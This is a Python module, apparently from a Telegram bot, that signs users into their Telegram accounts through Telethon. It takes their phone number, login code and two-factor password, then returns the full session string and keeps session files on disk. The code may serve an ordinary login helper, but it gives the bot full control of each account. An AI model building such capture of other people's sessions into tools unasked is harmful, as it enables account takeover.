import asyncio
import logging
import random
import os
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
from telethon.sessions import StringSession
import config

logger = logging.getLogger(__name__)

active_clients = {}
login_attempts = {}


async def send_otp_pyrogram(user_id, phone_number, api_id=None, api_hash=None):
    api_id = api_id or config.PYROGRAM_API_ID
    api_hash = api_hash or config.PYROGRAM_API_HASH

    if not api_id or not api_hash or str(api_id) == "0":
        return {"error": "credentials_missing"}

    if user_id in active_clients:
        try:
            await active_clients[user_id]["client"].disconnect()
        except Exception:
            pass
        active_clients.pop(user_id, None)

    os.makedirs("sessions", exist_ok=True)

    session_name = os.path.join("sessions", f"{user_id}_{phone_number}")
    session_path = session_name + ".session"
    client = TelegramClient(session_name, int(api_id), api_hash)
    try:
        await client.connect()
        sent = await client.send_code_request(phone_number)
        active_clients[user_id] = {
            "client": client,
            "phone_number": phone_number,
            "phone_code_hash": sent.phone_code_hash,
            "session_path": session_path,
        }
        return {"success": True}
    except Exception as e:
        logger.error(f"Telethon send_code failed for user {user_id}: {e}")
        try:
            await client.disconnect()
        except Exception:
            pass
        return {"error": str(e)}


async def verify_otp_pyrogram(user_id, otp):
    state = active_clients.get(user_id)
    if not state:
        return {"error": "no_active_session"}

    client = state["client"]
    phone_number = state["phone_number"]
    phone_code_hash = state["phone_code_hash"]

    try:
        await client.sign_in(phone_number, otp, phone_code_hash=phone_code_hash)
        me = await client.get_me()
        session_str = client.session.save()
        await client.disconnect()
        active_clients.pop(user_id, None)
        return {
            "success": True,
            "user_id": me.id,
            "username": me.username or "",
            "phone": me.phone or phone_number,
            "session_string": session_str,
            "session_path": state.get("session_path"),
        }
    except SessionPasswordNeededError:
        return {"error": "2fa_required"}
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        return {"error": "invalid_otp"}
    except Exception as e:
        error_str = str(e)
        if "PHONE_CODE_INVALID" in error_str or "PHONE_CODE_EXPIRED" in error_str:
            return {"error": "invalid_otp"}
        logger.error(f"Telethon verify_otp failed: {e}")
        try:
            await client.disconnect()
        except Exception:
            pass
        active_clients.pop(user_id, None)
        return {"error": error_str}


async def check_2fa_password(user_id, password):
    state = active_clients.get(user_id)
    if not state:
        return {"error": "no_active_session"}

    client = state["client"]
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        session_str = client.session.save()
        await client.disconnect()
        active_clients.pop(user_id, None)
        return {
            "success": True,
            "user_id": me.id,
            "username": me.username or "",
            "phone": me.phone or state.get("phone_number", ""),
            "session_string": session_str,
            "session_path": state.get("session_path"),
        }
    except Exception as e:
        error_str = str(e)
        if "PASSWORD_HASH_INVALID" in error_str or "password_hash_invalid" in error_str.lower():
            return {"error": "invalid_password"}
        logger.error(f"Telethon 2FA check failed: {e}")
        try:
            await client.disconnect()
        except Exception:
            pass
        active_clients.pop(user_id, None)
        return {"error": error_str}


async def cancel_login(user_id):
    state = active_clients.pop(user_id, None)
    if state:
        try:
            await state["client"].disconnect()
        except Exception:
            pass


def generate_mock_otp():
    return str(random.randint(10000, 99999))


def get_otp_attempts(user_id):
    return login_attempts.get(user_id, {"otp": 0, "2fa": 0})


def increment_otp_attempts(user_id):
    attempts = login_attempts.setdefault(user_id, {"otp": 0, "2fa": 0})
    attempts["otp"] += 1
    return attempts["otp"]


def increment_2fa_attempts(user_id):
    attempts = login_attempts.setdefault(user_id, {"otp": 0, "2fa": 0})
    attempts["2fa"] += 1
    return attempts["2fa"]


def reset_attempts(user_id):
    login_attempts.pop(user_id, None)
